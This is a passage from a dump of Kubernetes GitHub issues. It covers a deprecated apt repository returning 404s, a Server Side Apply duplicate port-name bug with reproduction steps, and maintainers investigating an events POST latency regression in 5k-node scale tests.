GNU/Linux\"\r\nID=debian\r\nHOME_URL=\"https://www.debian.org/\"\r\nSUPPORT_URL=\"https://www.debian.org/support\"\r\nBUG_REPORT_URL=\"https://bugs.debian.org/\"\r\n```\r\n- Kernel (e.g. `uname -a`): Linux penguin 5.4.74-10576-gb6cc41974db3 #1 SMP PREEMPT Sun Nov 8 15:08:12 PST 2020 x86_64 GNU/Linux\r\n\r\n- Install tools: kubeadm\r\n- Network plugin and version (if this is a network-related bug): n/a\r\n- Others:\r\n", "issue_labels": ["kind/bug", "sig/release", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "@aporcupine: This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "neolit123", "body": "/sig release\r\nthis is google owned infra.\r\nthere was already an issue for this logged in kubernetes/release about the flakes but i cannot find it.\r\n"}, {"author": "saschagrunert", "body": "Referenced this issue in an open Slack discussion since I see not much what we can do from a SIG Release perspective: https://kubernetes.slack.com/archives/CJH2GBF7Y/p1612887586202400"}, {"author": "saschagrunert", "body": "As discussed with the build admin, there is not much what we can do from our side since we do not host the packages directly. Can you please reopen if you encounter the issue again?\r\n\r\n/close"}, {"author": "k8s-ci-robot", "body": "@saschagrunert: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/97264#issuecomment-776522687):\n\n>As discussed with the build admin, there is not much what we can do from our side since we do not host the packages directly. Can you please reopen if you encounter the issue again?\r\n>\r\n>/close\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "BenTheElder", "body": "There's an ongoing effort to move this to community owned infrastructure where the project can have discretion over all aspects of the infra.\r\n\r\nAs it stand while my team at Google do perform builds and upload them to the existing host for the project, we don't own the host and it really nominally exists to host Google packages (like the GCP SDK) / isn't a product offering AIUI, we can pass along reports but I don't think there's a ton we can do here.\r\n\r\nIf we see widespread issues I will try harder to escalate, but in the meantime I'd like to continue focusing on unblocking community controlled infrastructure for the health of the project. We've been trying to eliminate anything that bottlenecks on us from that perspective (we don't mind doing it, but the project strongly prefers to have openly managed infra anyone can help with and audit, see: https://github.com/kubernetes/k8s.io)"}, {"author": "taxilian", "body": "As a data point, I'm seeing this issue now; trying to resolve.\r\n\r\n```\r\nGet:4 https://packages.cloud.google.com/apt kubernetes-xenial InRelease [9,383 B]\r\nIgn:6 https://packages.cloud.google.com/apt kubernetes-xenial/main amd64 Packages\r\nIgn:6 https://packages.cloud.google.com/apt kubernetes-xenial/main amd64 Packages\r\nIgn:6 https://packages.cloud.google.com/apt kubernetes-xenial/main amd64 Packages\r\nErr:6 https://packages.cloud.google.com/apt kubernetes-xenial/main amd64 Packages\r\n  404  Not Found [IP: 172.217.164.14 443]\r\nFetched 214 kB in 1s (206 kB/s)\r\nReading package lists... Done\r\nE: Failed to fetch https://packages.cloud.google.com/apt/dists/kubernetes-xenial/main/binary-amd64/by-hash/SHA256/6a386d103a1f74d6eb56422ee64a9d26a47f0125d87717beb1ba3c499b5b1ba4  404  Not Found [IP: 172.217.164.14 443]\r\nE: Some index files failed to download. They have been ignored, or old ones used instead.\r\n```\r\n"}, {"author": "holdenk", "body": "I've been running into this a bunch the past week."}, {"author": "5t33", "body": "Also seeing this problem. "}, {"author": "BenTheElder", "body": "https://github.com/kubernetes/release/issues/913, the project does not control this infrastructure and should be moving to community managed infrastructure in the future"}, {"author": "nmallar", "body": "I saw the following today while executing sudo apt-add-repository \"deb [http](https://apt.kubernetes.io/)[s](https://apt.kubernetes.io/)[://apt.kubernetes.io/](https://apt.kubernetes.io/) kubernetes-xenial main\"\r\n\r\nHit:1 http://us-east-1.ec2.archive.ubuntu.com/ubuntu focal InRelease\r\nHit:2 http://us-east-1.ec2.archive.ubuntu.com/ubuntu focal-updates InRelease\r\nHit:3 http://us-east-1.ec2.archive.ubuntu.com/ubuntu focal-backports InRelease\r\nHit:4 https://download.docker.com/linux/ubuntu focal InRelease\r\nIgn:5 https://packages.cloud.google.com/apt kubernetes-xenial InRelease\r\nErr:6 https://packages.cloud.google.com/apt kubernetes-xenial Release\r\n  404  Not Found [IP: 172.253.62.139 443]\r\nHit:7 http://security.ubuntu.com/ubuntu focal-security InRelease\r\nReading package lists... Done\r\nE: The repository 'https://apt.kubernetes.io kubernetes-xenial Release' does not have a Release file.\r\nN: Updating from such a repository can't be done securely, and is therefore disabled by default.\r\nN: See apt-secure(8) manpage for repository creation and user configuration details.\r\n\r\nAny help on how to fix this ?"}, {"author": "AnilKumar107", "body": "I am also facing same issue\r\nCould someone please help on this\r\n"}, {"author": "tycol7", "body": "Could this be the problem?\r\n\r\nhttps://github.com/kubernetes/release/issues/3485"}, {"author": "BenTheElder", "body": "Yes, this is no longer where the project hosts releases, there are more details in https://github.com/kubernetes/release/issues/3485 and there were announcements + a banner on kubernetes.io and again in the release announcement(s) https://kubernetes.io/blog/2023/12/13/kubernetes-v1-29-release/#legacy-linux-package-repositories\r\n\r\nPlease see the current TLDR in https://github.com/kubernetes/release/issues/3485\r\n\r\n"}, {"author": "flavian-anselmo", "body": "facing the same problem \r\n"}, {"author": "flavian-anselmo", "body": "> facing the same problem\r\n\r\nhttps://kubernetes.io/blog/2023/08/15/pkgs-k8s-io-introduction/\r\n"}, {"author": "vikashmuktha", "body": "@AnilKumar107 , @nmallar\r\nPlease follow official document \r\nhttps://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/#installing-kubeadm-kubelet-and-kubectl\r\ni think it works for you"}, {"author": "aak1247", "body": "Same error here"}, {"author": "aak1247", "body": "> @AnilKumar107 , @nmallar Please follow official document https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/#installing-kubeadm-kubelet-and-kubectl i think it works for you\r\n\r\nWe might need older version"}, {"author": "krishna-wstf", "body": "# Add the Kubernetes v1.29 repo\nsudo apt install -y apt-transport-https ca-certificates curl\nsudo mkdir -p /etc/apt/keyrings\ncurl -fsSL https://pkgs.k8s.io/core:/stable:/v1.29/deb/Release.key | \\\n  sudo gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg\n\necho \"deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://pkgs.k8s.io/core:/stable:/v1.29/deb/ /\" | \\\n  sudo tee /etc/apt/sources.list.d/kubernetes.list > /dev/null\n\n# Install kubelet, kubeadm, kubectl\nsudo apt update\nsudo apt install -y kubelet kubeadm kubectl\nsudo apt-mark hold kubelet kubeadm kubectl\n------------------\nuse this , work for me\n-----------\n"}, {"author": "wandrey7", "body": "> sudo apt-mark hold kubelet kubeadm kubectl\n\ntks, it's working"}, {"author": "BenTheElder", "body": "Note: https://kubernetes.io/releases\n\nAll currently supported releases have been on pkgs.k8s.io for some time now, see:\nhttps://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/#installing-kubeadm-kubelet-and-kubectl\n\nDebian also has some upstream packages again (not maintained by the Kubernetes project)\nhttps://packages.debian.org/trixie/kubectl"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 131147, "issue_url": "https://github.com/kubernetes/kubernetes/issues/131147", "issue_title": "Duplicate value error when editing a port/protocol with Server Side Apply", "issue_author": "pjiang-dev", "issue_body": "### What happened?\n\nWhen using `kubectl apply --server-side` on a deployment or service yaml file to edit a port number, it will result in this error:\n`\nThe Service \"test-service\" is invalid: spec.ports[1].name: Duplicate value: \"http\"\n`\nThe reason why we see 'duplicate' error when modifying port number is due to the protocol and port number being a composite key in managed fields:\n\n```\nmanagedFields:\n  - apiVersion: v1\n    fieldsType: FieldsV1\n    fieldsV1:\n      'f:spec':\n        'f:ports':\n          'k:{\"port\":1935,\"protocol\":\"TCP\"}':  # Port is part of the key\n            .: {}\n            'f:name': {}\n            'f:port': {}\n            'f:targetPort': {}\n```\nIt uses a composite key {\"port\":1935,\"protocol\":\"TCP\"} to identify unique ports\nWhen you try to change the port number while keeping the name the same, SSA sees this as a conflict because:\nThe old port entry is still managed by the previous apply\nThe new port entry with the same name but different port number is trying to be applied\nSSA treats this as a duplicate port name conflict\n\n### What did you expect to happen?\n\nserver side applies without errors. The service/deployment reflects the edited port number.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\n1.\n```\ncat <<EOF | kubectl apply -f -\napiVersion: v1\nkind: Service\nmetadata:\n  name: test-service\n  namespace: default\nspec:\n  ports:\n    - name: http\n      port: 80\n      targetPort: 80\nEOF\nservice/test-service created\n```\n\n2.\n```\ncat <<EOF | kubectl apply --server-side -f -\napiVersion: v1\nkind: Service\nmetadata:\n  name: test-service\n  namespace: default\nspec:\n  ports:\n    - name: http\n      port: 8080  # Changed from 80 to 8080\n      targetPort: 8080\nEOF\nThe Service \"test-service\" is invalid: spec.ports[1].name: Duplicate value: \"http\"\n```\n\n### Anything else we need to know?\n\nThis was originally found as part of an ArgoCD issue: (https://github.com/argoproj/argo-cd/issues/17717)\nThe issue uses a feature called Server Side Diff which depends on `kubectl apply --server-side [--dry-run=server]`\n\n### Kubernetes version\n\n<details>\n\n```console\nkubectl version\nClient Version: v1.32.1\nKustomize Version: v5.5.0\nServer Version: v1.32.0\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\nuname -a\nDarwin macos-JK700GFY27 23.6.0 Darwin Kernel Version 23.6.0: Wed Jul 31 20:50:00 PDT 2024; root:xnu-10063.141.1.700.5~1/RELEASE_ARM64_T6031 arm64ersion, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "needs-sig", "lifecycle/rotten", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "There are no sig labels on this issue. Please add an appropriate label by using one of the following commands:\n- `/sig <group-name>`\n- `/wg <group-name>`\n- `/committee <group-name>`\n\nPlease see the [group list](https://git.k8s.io/community/sig-list.md) for a listing of the SIGs, working groups, and committees available.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "7sunarni", "body": "This issue may be caused by the different behaviors of the service.spec.ports merge strategy and service.spec.ports validation. \n\nIn the merge strategy for service.spec.ports, the port number is used as the merge key. \nhttps://github.com/kubernetes/kubernetes/blob/908bdb3f2c487061975b9a06ca0480e3388bc285/staging/src/k8s.io/api/core/v1/types.go#L5583-L5591\nHowever, during validation, it requires the port name to be unique.\nhttps://github.com/kubernetes/kubernetes/blob/908bdb3f2c487061975b9a06ca0480e3388bc285/pkg/apis/core/validation/validation.go#L6119-L6130"}, {"author": "MohammadAlavi1986", "body": "This issue is the same as https://github.com/kubernetes/kubernetes/issues/130292"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/131147#issuecomment-3266140609):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 133600, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133600", "issue_title": "Regression in events POST latency at scale", "issue_author": "AwesomePatrol", "issue_body": "### What happened?\n\nLatency increased some ago for metric: `verb=POST`, `scope=resource`, `resource=events` ([dashboard](https://perf-dash.k8s.io/#/?jobname=gce-5000Nodes&metriccategoryname=APIServer&metricname=LoadResponsiveness_Prometheus&Resource=events&Scope=resource&Subresource=&Verb=POST))\n\n<img width=\"1323\" height=\"865\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/39c18704-65ab-4923-9782-b93f4c53b963\" />\n\n\n\n### What did you expect to happen?\n\nPOST latency to stay consistently below 300ms at 5k scale\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nRun performance tests on 5k+ scale on version 285c6113eab3ed (or earlier) and c1afec6a0b15ca (or later)\n\n### Anything else we need to know?\n\nhttps://github.com/kubernetes/kubernetes/compare/285c6113eab3ed...c1afec6a0b15ca\n\n### Kubernetes version\n\n1.34\n\n### Cloud provider\n\n<details>\nGCE\n</details>\n\n\n### OS version\n\n_No response_\n\n### Install tools\n\n_No response_\n\n### Container runtime (CRI) and version (if applicable)\n\n\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n\n", "issue_labels": ["kind/bug", "sig/scalability", "sig/api-machinery", "triage/accepted"], "comments": [{"author": "serathius", "body": "/sig scalability\n/sig api-machinery"}, {"author": "serathius", "body": "Regression affects 1.34 release."}, {"author": "yongruilin", "body": "/triage accepted\n/cc @liggitt \n@serathius any clues? it is a bit hard to pin down which change that brought this impact."}, {"author": "liggitt", "body": "is there a pointer to what that test does? does it test multiple resource types identically? if so, did only Events show a regression?"}, {"author": "serathius", "body": "> is there a pointer to what that test does? \n\nThis is the 5k nodes scalability test.\n\nWe have noticed regression but the test still passes as we are still withing K8s SLOs. So I don't think it's critical to be addressed before 1.34 release, but would be good to get confirm with SIG scalability. cc @marseel @mborsz @wojtek-t \n\nStill 950ms are a little close to my comfort. SLO is 1s"}, {"author": "serathius", "body": "@AwesomePatrol has confirmed that number of events has not changed between runs. There are around 900k events before and after."}, {"author": "liggitt", "body": "latency on create is pretty weird... that doesn't interact with much else...\n* is the test using generateName to create events or specifying a fixed name for the things it creates?\n* do we see other overall stress (CPU or memory) on the run jumping up? do we see increased latency for create of other types (if anything else in the test approaches anything like the same scale)"}, {"author": "liggitt", "body": "hmm.... I really don't see anything that looks at all related in that commit range...\n\nexcluding test files and generated files:\n\n```\ngit diff --numstat 285c6113eab3ed c1afec6a0b15ca | grep -e '.go$' | grep -v test | grep -v generat\n```\n\nutility commands not run as part of scale test:\n```\n1\t1\tcmd/genyaml/gen_kubectl_yaml.go\n1\t1\tcmd/importverifier/importverifier.go\n1\t1\tcmd/yamlfmt/yamlfmt.go\n```\n\ndoc change only / lock on feature gate which was already on (JobPodReplacementPolicy):\n```\n0\t2\tpkg/apis/batch/types.go\n0\t2\tstaging/src/k8s.io/api/batch/v1/types.go\n1\t0\tpkg/features/kube_features.go\n```\n\ntest change only:\n```\n1\t1\tpkg/controller/apis/config/fuzzer/fuzzer.go\n```\n\nunrelated, serialization change to DRA objects only\n```\n1\t1\tstaging/src/k8s.io/api/resource/v1beta1/types.go\n1\t1\tstaging/src/k8s.io/api/resource/v1beta2/types.go\n```\n\nbugfix to prevent creation via SSA during CRD delete:\n```\n44\t6\tstaging/src/k8s.io/apiextensions-apiserver/pkg/apiserver/customresource_handler.go\n```\n\nsupport new formats in CRDs:\n```\n26\t1\tstaging/src/k8s.io/apiextensions-apiserver/pkg/apiserver/validation/formats.go\n10\t4\tstaging/src/k8s.io/apiextensions-apiserver/pkg/apiserver/validation/validation.go\n24\t0\tvendor/k8s.io/kube-openapi/pkg/validation/strfmt/format.go\n143\t0\tvendor/k8s.io/kube-openapi/pkg/validation/strfmt/kubernetes-extensions.go\n```\n\noptimize performance of \"nothing\" selector\n```\n11\t1\tstaging/src/k8s.io/apimachinery/pkg/labels/selector.go\n8\t0\tstaging/src/k8s.io/client-go/tools/cache/listers.go\n```\n\ndoc only\n```\n2\t0\tstaging/src/k8s.io/apimachinery/pkg/util/errors/errors.go\n```\n\nchange Update handling to give a nicer error if the object doesn't exist:\n```\n4\t1\tstaging/src/k8s.io/apiserver/pkg/registry/generic/registry/store.go\n```\n\nwatchlist changes, not relevant to events if no watch cache is used:\n```\n0\t4\tstaging/src/k8s.io/apiserver/pkg/storage/cacher/cacher.go\n22\t4\tstaging/src/k8s.io/apiserver/pkg/storage/cacher/lister_watcher.go\n5\t13\tstaging/src/k8s.io/client-go/tools/cache/reflector.go\n```\n\nimproved error detection during a List request\n```\n10\t0\tstaging/src/k8s.io/apiserver/pkg/storage/etcd3/store.go\n```\n\nno-op import order change\n```\n1\t1\tstaging/src/k8s.io/cli-runtime/pkg/resource/query_param_verifier.go\n1\t1\tstaging/src/k8s.io/component-base/metrics/opts.go\n```\n\ndisplay improvement:\n```\n4\t0\tstaging/src/k8s.io/kubectl/pkg/cmd/delete/delete.go\n```\n\ndrop log line:\n```\n0\t1\tstaging/src/k8s.io/kubectl/pkg/util/i18n/i18n.go\n```\n\nswitch to the new upstream maintained yaml library (intended to be a no-op... we did check the code was identical, the diff was in comment reformatting):\n```\n0\t0\tvendor/{sigs.k8s.io/yaml/goyaml.v2 => go.yaml.in/yaml/v2}/apic.go\n0\t0\tvendor/{sigs.k8s.io/yaml/goyaml.v2 => go.yaml.in/yaml/v2}/decode.go\n0\t0\tvendor/{sigs.k8s.io/yaml/goyaml.v2 => go.yaml.in/yaml/v2}/emitterc.go\n0\t0\tvendor/{sigs.k8s.io/yaml/goyaml.v2 => go.yaml.in/yaml/v2}/encode.go\n0\t0\tvendor/{sigs.k8s.io/yaml/goyaml.v2 => go.yaml.in/yaml/v2}/parserc.go\n0\t0\tvendor/{sigs.k8s.io/yaml/goyaml.v2 => go.yaml.in/yaml/v2}/readerc.go\n0\t0\tvendor/{sigs.k8s.io/yaml/goyaml.v2 => go.yaml.in/yaml/v2}/resolve.go\n0\t0\tvendor/{sigs.k8s.io/yaml/goyaml.v2 => go.yaml.in/yaml/v2}/scannerc.go\n0\t0\tvendor/{sigs.k8s.io/yaml/goyaml.v2 => go.yaml.in/yaml/v2}/sorter.go\n0\t0\tvendor/{sigs.k8s.io/yaml/goyaml.v2 => go.yaml.in/yaml/v2}/writerc.go\n1\t1\tvendor/{sigs.k8s.io/yaml/goyaml.v2 => go.yaml.in/yaml/v2}/yaml.go\n0\t0\tvendor/{sigs.k8s.io/yaml/goyaml.v2 => go.yaml.in/yaml/v2}/yamlh.go\n0\t0\tvendor/{sigs.k8s.io/yaml/goyaml.v2 => go.yaml.in/yaml/v2}/yamlprivateh.go\n4\t4\tvendor/{sigs.k8s.io/yaml/goyaml.v3 => go.yaml.in/yaml/v3}/apic.go\n21\t3\tvendor/{sigs.k8s.io/yaml/goyaml.v3 => go.yaml.in/yaml/v3}/decode.go\n15\t4\tvendor/{sigs.k8s.io/yaml/goyaml.v3 => go.yaml.in/yaml/v3}/emitterc.go\n0\t0\tvendor/{sigs.k8s.io/yaml/goyaml.v3 => go.yaml.in/yaml/v3}/encode.go\n78\t62\tvendor/{sigs.k8s.io/yaml/goyaml.v3 => go.yaml.in/yaml/v3}/parserc.go\n4\t4\tvendor/{sigs.k8s.io/yaml/goyaml.v3 => go.yaml.in/yaml/v3}/readerc.go\n0\t0\tvendor/{sigs.k8s.io/yaml/goyaml.v3 => go.yaml.in/yaml/v3}/resolve.go\n22\t20\tvendor/{sigs.k8s.io/yaml/goyaml.v3 => go.yaml.in/yaml/v3}/scannerc.go\n0\t0\tvendor/{sigs.k8s.io/yaml/goyaml.v3 => go.yaml.in/yaml/v3}/sorter.go\n4\t4\tvendor/{sigs.k8s.io/yaml/goyaml.v3 => go.yaml.in/yaml/v3}/writerc.go\n45\t40\tvendor/{sigs.k8s.io/yaml/goyaml.v3 => go.yaml.in/yaml/v3}/yaml.go\n6\t4\tvendor/{sigs.k8s.io/yaml/goyaml.v3 => go.yaml.in/yaml/v3}/yamlh.go\n10\t10\tvendor/{sigs.k8s.io/yaml/goyaml.v3 => go.yaml.in/yaml/v3}/yamlprivateh.go\n85\t0\tvendor/sigs.k8s.io/yaml/goyaml.v2/yaml_aliases.go\n0\t39\tvendor/sigs.k8s.io/yaml/goyaml.v3/patch.go\n130\t0\tvendor/sigs.k8s.io/yaml/goyaml.v3/yaml_aliases.go\n9\t2\tvendor/sigs.k8s.io/yaml/yaml.go\n0\t31\tvendor/sigs.k8s.io/yaml/yaml_go110.go\n```\n"}, {"author": "serathius", "body": "Noticed latency increase in etcd events trace logs. Etcd logs requests with duration > 100ms. The average latency of put requests on events in trace logs has changed between:\n* https://prow.k8s.io/view/gcs/kubernetes-ci-logs/logs/ci-kubernetes-e2e-gce-scale-performance/1936469499796525056/ - 218ms\n* https://prow.k8s.io/view/gcs/kubernetes-ci-logs/logs/ci-kubernetes-e2e-gce-scale-performance/1937919152668807168/ - 459ms\n\nThat's a doubling latency on just etcd. That would imply performance regression in either etcd or infrastructure."}, {"author": "liggitt", "body": "> Noticed latency increase in etcd events trace logs. Etcd logs requests with duration > 100ms. The average latency of put requests on events has changed between:\n> \n> * https://prow.k8s.io/view/gcs/kubernetes-ci-logs/logs/ci-kubernetes-e2e-gce-scale-performance/1936469499796525056/ - 218ms\n> * https://prow.k8s.io/view/gcs/kubernetes-ci-logs/logs/ci-kubernetes-e2e-gce-scale-performance/1937919152668807168/ - 459ms\n> \n> That's a doubling latency on just etcd. So it's performance regression in either etcd or infrastructure.\n\ninteresting... I don't *think* the etcd version changed in that commit range (I didn't see any cluster script or kubeadm changes ... does the scale test set up a cluster in some other way that *could* have changed etcd)?\n\ndo we know what other inputs to the test were? (test-infra, or perf test commits, or changes to the CI pools)?"}, {"author": "serathius", "body": "> does the scale test set up a cluster in some other way that could have changed etcd)?\n\nNo, it uses the same etcd version as used in all K8s testing. https://github.com/kubernetes/kubernetes/blob/4e8b192b66cc2a6952b8f1a5067e563c4019c276/build/dependencies.yaml#L65-L80\n\n> do we know what other inputs to the test were? (test-infra, or perf test commits, or changes to the CI pools)?\n\nLooking"}, {"author": "serathius", "body": "Also, I don't think it's related to https://github.com/kubernetes/kubernetes/pull/133604 as https://prow.k8s.io/view/gcs/kubernetes-ci-logs/logs/ci-kubernetes-e2e-gce-scale-performance/1937919152668807168/ which is first run with visible regression still includes range on `/registry/events/` prefix in logs instead of `/registry/` prefix."}, {"author": "serathius", "body": "No changes in test-infra config other than image bumping https://github.com/kubernetes/test-infra/pull/35330\n\nhttps://github.com/kubernetes/test-infra/blob/73b2e44567b222cc638f69c2a0eccdbecb354215/config/jobs/kubernetes/sig-scalability/sig-scalability-periodic-jobs.yaml#L441-L525"}, {"author": "serathius", "body": "Also no changes to clusterloader2 scenarios used for 5k tests like: `load`, `huge-service`, `access-tokens`. Only `dra` and `dra-baseline` scenarios were changed.\n\nhttps://github.com/kubernetes/perf-tests/tree/master/clusterloader2/testing"}, {"author": "serathius", "body": "There is a correlation with resources used by etcd:\n\nEtcd events CPU\n<img width=\"1517\" height=\"950\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/ba891232-681a-493a-b495-6635070e06c4\" />\n\nEtcd events Memory\n<img width=\"1526\" height=\"955\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/b027de43-c3e8-480a-bde6-ab5849788e15\" />\n\nAnd etcd main memory\n\n<img width=\"1525\" height=\"955\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/a3b17383-3f11-4f5f-93e1-aeba2b662577\" />"}, {"author": "serathius", "body": "Interestingly the latency increase has started from https://prow.k8s.io/view/gcs/kubernetes-ci-logs/logs/ci-kubernetes-e2e-gce-scale-performance/1937919152668807168/ run while resources were kept the same and increased in the following run https://prow.k8s.io/view/gcs/kubernetes-ci-logs/logs/ci-kubernetes-e2e-gce-scale-performance/1938643935987503104/\n\nSo possibly the diff we should consider is broader: https://github.com/kubernetes/kubernetes/compare/285c6113eab3ed...1680008ddc74dc or there are multiple overlapping changes."}, {"author": "serathius", "body": "I would guess that https://github.com/kubernetes/kubernetes/pull/132355 is responsible for increase in resources used by etcd in https://prow.k8s.io/view/gcs/kubernetes-ci-logs/logs/ci-kubernetes-e2e-gce-scale-performance/1938643935987503104/ due to https://github.com/etcd-io/etcd/issues/20386, however increase of latency was visible in previous run https://prow.k8s.io/view/gcs/kubernetes-ci-logs/logs/ci-kubernetes-e2e-gce-scale-performance/1937919152668807168/ that didn't include it"}, {"author": "dims", "body": "@serathius how about COS image itself? seems like it changed from 1937194282637070336 to 1937919152668807168"}, {"author": "serathius", "body": "We see some improvements thanks to https://github.com/kubernetes/kubernetes/pull/133604 in etcd memory usage. At this moment let's wait and see. Still the test has never failed so we should be good."}, {"author": "serathius", "body": "There was no improvement in POST latency of events. Looking at the number of events in scalability tests the latency increase makes sense. With over 1 million events the cost of just listing keys is huge. Options:\n* Disable estimating resource size for events. PR: https://github.com/kubernetes/kubernetes/pull/133873\n* Implement pagination for keysOnly. With internal page size of 10'000, listing 1 million keys doesn't seem like a good idea."}, {"author": "serathius", "body": "Found possible other reason for higher load on events. We run 2 storages on events, which means twice the calls to getKeys.\n\n```\n$ kubectl logs -n kube-system kube-apiserver-kind-control-plane | grep \"New\" | cut -d' ' -f12- | sort | uniq\netcd3.New\" group=\"admissionregistration.k8s.io\" resource=\"mutatingwebhookconfigurations\" resourcePrefix=\"/mutatingwebhookconfigurations\"\netcd3.New\" group=\"admissionregistration.k8s.io\" resource=\"validatingadmissionpolicies\" resourcePrefix=\"/validatingadmissionpolicies\"\netcd3.New\" group=\"admissionregistration.k8s.io\" resource=\"validatingadmissionpolicybindings\" resourcePrefix=\"/validatingadmissionpolicybindings\"\netcd3.New\" group=\"admissionregistration.k8s.io\" resource=\"validatingwebhookconfigurations\" resourcePrefix=\"/validatingwebhookconfigurations\"\netcd3.New\" group=\"apiextensions.k8s.io\" resource=\"customresourcedefinitions\" resourcePrefix=\"/apiextensions.k8s.io/customresourcedefinitions\"\netcd3.New\" group=\"apiregistration.k8s.io\" resource=\"apiservices\" resourcePrefix=\"/apiregistration.k8s.io/apiservices\"\netcd3.New\" group=\"apps\" resource=\"controllerrevisions\" resourcePrefix=\"/controllerrevisions\"\netcd3.New\" group=\"apps\" resource=\"daemonsets\" 